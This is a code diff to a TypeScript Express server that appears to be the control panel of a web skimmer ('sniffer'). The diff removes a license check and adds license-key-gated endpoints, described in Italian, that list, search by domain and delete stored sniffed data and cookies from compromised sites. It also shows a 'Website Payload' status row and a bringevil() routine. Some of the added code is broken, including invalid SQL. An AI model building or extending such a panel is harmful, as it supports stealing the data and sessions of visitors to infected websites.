@@ -7,12 +7,10 @@ import * as sqlite3 from 'sqlite3';
 import {Generator} from "./modules/generator";
 import {Logger} from "./modules/logger";
 import {Loader} from "./modules/loader";
-import {Locker} from "./modules/locker";
 const app = express();
 export class App {
   public conf:any;
   private logger:Logger;
-  public locker:Locker;
   public generator:Generator;
   public loader:Loader;
   public eccipient: any;
@@ -22,7 +20,6 @@ export class App {
   public contain: any;
   public db: any = new sqlite3.Database('./history.db');
     constructor() {
-        this.locker = new Locker();
         this.logger = new Logger();
         this.generator = new Generator();
         this.loader = new Loader();
@@ -38,14 +35,12 @@ export class App {
                 this.conf = JSON.parse(jsonString);
                 console.log('[!] Instance User:'+this.conf.instanceUser);
                 console.log('[!] License Key:'+this.conf.licenseKey);
-                this.locker.verify(this.conf);
                 this.salty=""+this.conf.instanceUser;
                 this.generator.populate(JSON.parse(jsonString),this.salty);
                 this.bringevil();
                 this.logger.initDb();
                 this.start(this.conf.port,this.detectedIp);
             });
-
     }
     public bringevil(): void{
       this.eccipient = this.generator.init();
@@ -72,38 +67,33 @@ export class App {
                                table {
                                  font-family: arial, sans-serif;
                                  border-collapse: collapse;
-                                 width: 100%;
+                                 width:500px;
                                }
                                td, th {
                                  border: 1px solid #dddddd;
                                  text-align: left;
                                  padding: 8px;
                                }
-                               tr:nth-child(even) {
+                               tr {
                                  background-color: #dddddd;
                                }
                            </style>
                            <h2>STATUS Page</h2>
                            <table>
+                           <thead>
                            <tr>
                            <th>Parametri</th>
                            <th>Status</th>
                            </tr>
                            <tr>
+                           </thead>
+                           <tbody>
                            <td>User</td>
                            <td>`+this.conf.instanceUser+`</td>
                            </tr>
                            <tr>
                            <td>Port</td>
                            <td>`+this.conf.port+`</td>
-                           </tr>
-                           <tr>
-                           <td>Start Date</td>
-                           <td>`+this.conf.initDate+`</td>
-                           </tr>
-                           <tr>
-                           <td>End Date</td>
-                           <td>`+this.conf.endDate+`</td>
                            </tr>
                            <tr>
                            <td>Timer Polling</td>
@@ -133,14 +123,7 @@ export class App {
                            <td>Website Payload (Server-Side)</td>
                            <td>`+'<xmp>'+this.expose+'</xmp>'+`</td>
                            </tr>
-                           <tr>
-                           <td>CrossBrowser Payload (Client-Side)</td>
-                           <td>`+'asd'+`</td>
-                           </tr>
-                           <tr>
-                           <td>CrossBrowser Loader (Client-Side)</td>
-                           <td>`+'asd'+`</td>
-                           </tr>
+                          </tbody>
                            </table>
                    `)
                    res.end();
@@ -208,17 +191,28 @@ export class App {
                   <td>Modifica il tempo di comunicazione in secondi dello sniffer</td>
                   </tr>
                   <tr>
-                  <td>/licenseKey/history/list</td>
+                  <td>/licenseKey/info/list</td>
+                  <td>Ritorna uno storico riguardante i dati sniffati sui vari siti a cui è collegato</td>
+                  </tr>
+                  <tr>
+                  <tr>
+                  <td>/licenseKey/session/list</td>
                   <td>Ritorna uno storico riguardante le operazioni di sniff sui vari siti a cui è collegato</td>
                   </tr>
                   <tr>
-                  <td>/licenseKey/history/clear</td>
+                  <tr>
+                  <td>/licenseKey/search/info</td>
+                  <td>Ritorna uno storico riguardante i chunks di sniff sui vari siti relativi al dominio cercato</td>
+                  </tr>
+                  <tr>
+                  <td>/licenseKey/db/clear</td>
                   <td>Cancella lo storico relativo alle operazioni di sniff sui vari siti a cui è collegato</td>
                   </tr>
                   </table>`);
         res.end();
         });
         app.get('/'+this.conf.licenseKey+'/restart',(req,res)=>{
+             this.db.close();
 	           process.exit(1);
              res.end();
         });
@@ -333,10 +327,18 @@ export class App {
             });
         });
         app.get('/'+this.conf.licenseKey+'/db/clear',(req,res)=>{
-
+          const sql = "DELETE * FROM info ";
+          this.db.all(sql, function(err) {
+            if (err) {
+              res.send('No result found');
+            }
+            res.json({
+                       "message":"success",
+                   });
+            });
         });
         app.get('/'+this.conf.licenseKey+'/search/info/:keywordname',(req,res)=>{
-          const sql = "SELECT chunks AND cookie FROM info WHERE address=? ";
+          const sql = "SELECT * FROM info WHERE address=? ";
           this.db.all(sql, [req.params.keywordname], function(err, rows) {
             if (err) {
               res.send('No result found');
@@ -359,7 +361,7 @@ export class App {
          });
         const web = http.createServer(app);
         web.listen(x,y , () => {
-          console.log('[!] Server Status ON with '+`PID: ${process.pid}`+' Given IP Addr:'+this.detectedIp);
+          console.log('[!] Server Status ON with '+`PID: ${process.pid}`+' Given IP Addr:'+this.detectedIp+':'+this.conf.port);
         });
     }
 }
